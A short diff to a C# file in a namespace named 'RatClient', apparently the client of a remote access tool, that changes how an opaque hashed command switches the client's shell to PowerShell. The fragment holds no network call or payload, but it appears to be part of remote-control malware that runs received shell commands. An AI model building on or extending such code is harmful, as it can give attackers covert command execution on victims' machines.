@@ -101,7 +101,8 @@ namespace RatClient
 			}
             else if(command == "adfd9a3aa5bc568d540db256a3782c04")
             {
-                return Tools.SwitchShell("powershell.exe");
+                Info.MainShell = "powershell.exe";
+                return Tools.RunCommand("powershell",addCd:true);
 			}
             else
             {
